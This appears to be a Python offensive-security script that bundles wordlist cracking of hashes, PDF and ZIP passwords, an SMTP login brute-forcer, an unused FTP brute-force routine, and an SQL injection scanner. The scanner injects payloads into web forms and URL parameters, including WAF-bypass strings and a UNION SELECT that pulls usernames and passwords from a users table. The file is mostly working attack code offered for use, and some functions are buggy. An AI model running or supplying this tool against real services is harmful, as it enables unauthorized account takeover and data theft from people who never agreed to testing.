import hashlib
import pikepdf
import pyzipper
import os
import sys
from tqdm import tqdm
import concurrent.futures
import logging
from itertools import islice
import argparse
import smtplib
import socket
import time
import ssl
import threading
import random
import ftplib
import queue
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
from colorama import Fore, Back, Style, init
from fake_useragent import UserAgent

# Initialize colorama
init(autoreset=True)

# Set up logging
logging.basicConfig(filename='crack.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# List of supported hash types
hash_names = [
    'blake2b', 'blake2s', 'md5', 'sha1', 'sha224', 'sha256', 
    'sha384', 'sha3_224', 'sha3_256', 'sha3_384', 'sha3_512', 'sha512',
]

# Set up argument parsing
parser = argparse.ArgumentParser(description='Crack a hash, a PDF password, a ZIP password, perform an SMTP brute force attack, or SQLi scan using a wordlist.')
parser.add_argument('-ha', '--hash', type=str, help='The hash to crack')
parser.add_argument('-p', '--pdf', type=str, help='Path to the PDF file')
parser.add_argument('-z', '--zip', type=str, help='Path to the ZIP file')
parser.add_argument('wordlist', type=str, help='Path to the wordlist file')
parser.add_argument('--hash-type', help='The hash type to use.', default='md5', choices=hash_names)
parser.add_argument('-e', '--extract', help='Path to extract the ZIP file contents', type=str)
parser.add_argument('-l', '--login', type=str, help="Username for SMTP brute force")
parser.add_argument('host', type=str, nargs='?', help="SMTP server host for brute force")  # Changed to optional
parser.add_argument('port', type=int, nargs='?', help="SMTP server port (e.g., 587 or 465)")  # Changed to optional
parser.add_argument('--redirect', help="Redirect URL to check for success condition")
parser.add_argument('-t', '--threads', type=int, default=4, help="Number of threads for parallel attack (default 4)")
parser.add_argument('--url', help="URL to test for SQLi vulnerabilities")
parser.add_argument('--random-agent', action='store_true', help="Use a random User-Agent for HTTP requests")

args = parser.parse_args()

# Ensure the wordlist exists
if not os.path.exists(args.wordlist):
    print(f"Error: Wordlist file '{args.wordlist}' not found.")
    sys.exit(1)

# Function to crack a hash
def crack_hash(hash, wordlist, hash_type):
    """Crack a hash using a wordlist."""
    hash_fn = getattr(hashlib, hash_type, None)
    if hash_fn is None or hash_type not in hash_names:
        raise ValueError(f'[!] Invalid hash type: {hash_type}, supported are {hash_names}')
    
    # Count the number of lines in the wordlist
    total_lines = sum(1 for line in open(wordlist, 'r'))
    print(f"[*] Cracking hash {hash} using {hash_type} with a list of {total_lines} words.")
    
    # Open the wordlist
    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
        for line in tqdm(f, desc='Cracking hash', total=total_lines):
            if hash_fn(line.strip().encode()).hexdigest() == hash:
                return line.strip()

# Function to read passwords lazily (for large wordlists)
def read_passwords(wordlist_path, chunk_size=100):
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        while True:
            chunk = list(islice(f, chunk_size))
            if not chunk:
                break
            yield [line.strip() for line in chunk]

# Function to try a password for a PDF
def try_password(password, pdf_file):
    try:
        with pikepdf.open(pdf_file, password=password):
            # Password decrypted successfully
            logging.info(f"[+] Password found: {password}")
            print(f"[+] Password found: {password}")
            return password  # Returning the found password
    except pikepdf.PasswordError:
        # Incorrect password
        return None
    except Exception as e:
        logging.error(f"Error while trying password '{password}': {e}")
        return None

# Function to crack a PDF password using a wordlist
def crack_pdf_password(pdf_file, wordlist):
    password_found = None

    # Using ThreadPoolExecutor to run password cracking in parallel
    with concurrent.futures.ThreadPoolExecutor() as executor:
        for passwords_chunk in read_passwords(wordlist):
            futures = [executor.submit(try_password, password, pdf_file) for password in passwords_chunk]
            for future in tqdm(concurrent.futures.as_completed(futures), "Decrypting PDF"):
                result = future.result()
                if result:
                    password_found = result
                    break
            if password_found:
                break
    
    if not password_found:
        print("[-] Password not found in the provided wordlist.")
    return password_found

# Brute force for ZIP file
def brute_force_zip(zip_file_path, wordlist_path, extraction_path):
    failed_attempts = []  # List to store failed attempts for one line of output
    with pyzipper.AESZipFile(zip_file_path) as zf:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as wordlist_file:
            for line in wordlist_file:
                password_str = line.strip()  # Remove any leading/trailing whitespace (e.g., newlines)
                try:
                    zf.pwd = password_str.encode('utf-8')
                    zf.extractall(path=extraction_path)
                    print(f"Password found: {password_str}")
                    return password_str
                except RuntimeError:
                    failed_attempts.append(password_str)  # Append failed attempt to the list
                    continue
                except Exception as e:
                    print(f"Error for: {password_str}, Error: {e}")
                    continue

    # Print all failed attempts in a single line after trying all passwords
    if failed_attempts:
        print(f"Attempt Failed: {' '.join(failed_attempts)}")  # Join all failed attempts into one line
    else:
        print("Password not found in the wordlist")

# SMTP Brute force attack
def smtp_bruteforce(username, wordlist, host, port, thread_id):
    try:
        # Create an unencrypted connection
        server = smtplib.SMTP(host, port, timeout=10)
        server.set_debuglevel(0)  # Set debug level

        # Use STARTTLS if supported
        server.starttls(context=ssl.create_default_context())

        # Try logging in
        for password in wordlist:
            password = password.strip()
            try:
                server.login(username, password)
                print(f"[+] [Thread-{thread_id}] Successfully logged in as {username} with password {password}")
                server.quit()
                return True
            except smtplib.SMTPAuthenticationError:
                print(f"[-] [Thread-{thread_id}] Failed login for {username} with password {password}")
                continue
        server.quit()
        return False
    except (smtplib.SMTPConnectError, socket.error) as e:
        print(f"[Thread-{thread_id}] Connection error: {e}")
        return False

# Function to handle the SMTP brute force using threads
def smtp_worker(username, wordlist, host, port, thread_id):
    for password in wordlist:
        password = password.strip()
        if smtp_bruteforce(username, password, host, port, thread_id):
            break
        time.sleep(random.uniform(0.5, 2.5))  # Random delay between attempts

# Initialize the FTP queue
q = queue.Queue()

# Number of threads to spawn for FTP
n_threads = 30

def connect_ftp(host, user):
    global q
    while True:
        # Get the password from the queue
        password = q.get()
        # Initialize the FTP server object
        server = ftplib.FTP()
        print("[!] Trying", password)
        try:
            # Try to connect to FTP server with a timeout of 5
            server.connect(host, 21, timeout=5)
            # Login using the credentials (user & password)
            server.login(user, password)
        except ftplib.error_perm:
            # Login failed, wrong credentials
            pass
        else:
            # Correct credentials
            print(f"[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}")
            # We found the password, let's clear the queue
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:
            # Notify the queue that the task is completed for this password
            q.task_done()

# Function to detect forms on a webpage
def detect_forms(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        forms = soup.find_all('form')
        return forms
    except requests.RequestException as e:
        print(Fore.RED + f"[CRITICAL] Error while detecting forms: {e}")
        return []

# Function to check if a form uses POST
def is_post_form(form):
    method = form.get('method', 'get').lower()
    return method == 'post'

# Function to handle cookies and ask user if they want to accept them
def handle_cookies(response):
    cookies = response.cookies
    if cookies:
        cookie_str = "; ".join([f"{cookie.name}={cookie.value}" for cookie in cookies])
        print(f"\n[INFO] Server wants to set cookies: {cookie_str}")
        
        user_input = input("Do you want to use these cookies [Y/n]? ").strip().lower()
        
        if user_input == 'n' or user_input == 'no':
            print("[INFO] Not using the cookies set by the server.")
            return None  # Return None if user doesn't want to use the cookies
        else:
            print("[INFO] Using the cookies set by the server.")
            return cookies  # Return cookies if the user accepts them
    else:
        return None  # No cookies from the server, so return None

# Example usage in the SQLi scanning function
# Function to check if a GET parameter is vulnerable to SQL injection
def test_sql_injection(url, forms, payloads, redirect_url=None):
    session = requests.Session()

    # Use random user agent if --random-agent is specified
    if args.random_agent:
        ua = UserAgent()
        headers = {
            "User-Agent": ua.random
        }
        session.headers.update(headers)
        print(Fore.CYAN + f"[INFO] Using random user-agent: {session.headers['User-Agent']}")

    vulnerable = False  # Track if SQLi vulnerability is detected

    # WAF bypass techniques
    waf_bypass_payloads = [
        "' OR 1=1 --",        # Basic SQLi with comment
        '" OR 1=1 --',
        "' OR 'a'='a' --",    # Bypassing some WAFs that look for 1=1
        "admin' --",          # Trying simple SQLi with common table names
        "1' OR 1=1#",         # SQLi with different comment style
        "'/**/OR/**/1=1/**/--",  # SQLi with space obfuscation
        "'/**/UNION/**/SELECT/**/NULL,username,password/**/FROM/**/users--",  # UNION-based injection
        "'/**/union/**/select/**/1,2,3,4--",  # UNION SELECT with obfuscation
        "'/*!50000UNION*/SELECT*FROM*users--",  # Using MySQL version-specific comment
    ]
    
    print(Fore.CYAN + f"[INFO] Testing connection to the target URL: {url}")
    
    # Step 1: Test POST forms first
    for form in forms:
        if is_post_form(form):
            action = form.get('action', '')
            action_url = urljoin(url, action)  # resolve action URL if relative
            inputs = form.find_all('input')
            
            # Create a dictionary of form inputs, including hidden fields
            form_data = {}
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    form_data[name] = input_tag.get('value', '')  # Get the default value or empty
            
            # Try each payload on the form fields, including WAF bypass techniques
            for payload in payloads + waf_bypass_payloads:  # Add WAF bypass payloads here
                print(Fore.CYAN + f"[INFO] Testing payload: {payload}")
                
                # Inject the payload into each form field
                for field_name in form_data:
                    form_data[field_name] = payload
                
                try:
                    # Send the form data with the payloads injected
                    response = session.post(action_url, data=form_data, allow_redirects=True)
                    
                    # Handle cookies if set by the server
                    cookies = handle_cookies(response)
                    if cookies:
                        session.cookies.update(cookies)  # If accepted, update session cookies

                    # Check for a redirect to the specified redirect URL
                    if redirect_url and response.url == redirect_url:
                        print(Fore.GREEN + f"[INFO] Detected redirect to the expected URL: {redirect_url}")
                        vulnerable = True
                        break
                    
                    # Basic response check for SQLi
                    if "error" in response.text.lower() or "syntax" in response.text.lower() or "unexpected" in response.text.lower():
                        print(Fore.GREEN + f"[INFO] Possible SQLi vulnerability detected with payload: {payload}")
                        vulnerable = True
                        break
                except requests.RequestException as e:
                    print(Fore.RED + f"[CRITICAL] Request error: {e}")
                    
            if vulnerable:
                break

    # Step 2: If no vulnerability found with POST, test GET parameters in the URL
    if not vulnerable:
        print(Fore.CYAN + f"[INFO] No POST form vulnerability detected. Now testing GET parameters...")

        # Parse the URL for GET parameters
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        params = parsed_url.query
        
        # If URL has parameters, inject payloads into each parameter
        if params:
            # Split parameters
            param_list = params.split('&')
            for param in param_list:
                param_name = param.split('=')[0]
                for payload in payloads + waf_bypass_payloads:
                    test_url = f"{base_url}?{param_name}={payload}"
                    print(Fore.CYAN + f"[INFO] Testing URL with payload: {test_url}")
                    
                    try:
                        response = session.get(test_url, allow_redirects=True)
                        
                        # Handle cookies if set by the server
                        cookies = handle_cookies(response)
                        if cookies:
                            session.cookies.update(cookies)  # If accepted, update session cookies

                        # Check for SQLi signs in the response
                        if "error" in response.text.lower() or "syntax" in response.text.lower() or "unexpected" in response.text.lower():
                            print(Fore.GREEN + f"[INFO] Possible SQLi vulnerability detected with payload: {payload}")
                            print(Fore.YELLOW + f"[INFO] GET parameter '{param_name}' is vulnerable!")
                            vulnerable = True
                            break
                    except requests.RequestException as e:
                        print(Fore.RED + f"[CRITICAL] Request error: {e}")
                
                if vulnerable:
                    break

    # Final result
    if not vulnerable:
        print(Fore.RED + "[INFO] No SQLi vulnerability detected.")
    
    return vulnerable

# Function to load payloads from a file
def load_payloads(payload_file):
    try:
        with open(payload_file, 'r') as file:
            payloads = file.readlines()
            return [payload.strip() for payload in payloads]
    except FileNotFoundError:
        print(Fore.RED + f"[CRITICAL] Payload file {payload_file} not found.")
        return []

# Main execution logic
if __name__ == "__main__":
    if args.hash:
        # Crack hash if a hash is provided
        print("\n[+] Cracking hash...")
        cracked_password = crack_hash(args.hash, args.wordlist, args.hash_type)
        if cracked_password:
            print(f"[+] PASSWORD DECRYPTED: {cracked_password}")
        else:
            print("[-] Hash not found in the provided wordlist.")
    
    elif args.pdf:
        # Crack PDF password if a PDF file is provided
        if not os.path.exists(args.pdf):
            print(f"Error: PDF file '{args.pdf}' not found.")
            sys.exit(1)

        print("\n[+] Cracking PDF password...")
        cracked_password = crack_pdf_password(args.pdf, args.wordlist)
        if cracked_password:
            print(f"[+] PASSWORD DECRYPTED: {cracked_password}")
    
    elif args.zip:
        # Crack ZIP file password if a ZIP file is provided
        if not os.path.exists(args.zip):
            print(f"Error: ZIP file '{args.zip}' not found.")
            sys.exit(1)

        print("\n[+] Cracking ZIP file password...")
        brute_force_zip(args.zip, args.wordlist, args.extract)
    
    elif args.host and args.port and args.login:
        # Perform SMTP brute force
        print("\n[+] Performing SMTP brute force attack...")
        wordlist = [line.strip() for line in open(args.wordlist)]
        smtp_worker(args.login, wordlist, args.host, args.port, 1)
    
    elif args.url:
        # Perform SQLi attack
        if not os.path.exists(args.wordlist):
            print(f"Error: Payload file '{args.wordlist}' not found.")
            sys.exit(1)

        payloads = load_payloads(args.wordlist)
        if payloads:
            print("\n[+] Performing SQLi scan...")
            forms = detect_forms(args.url)
            test_sql_injection(args.url, forms, payloads, args.redirect)
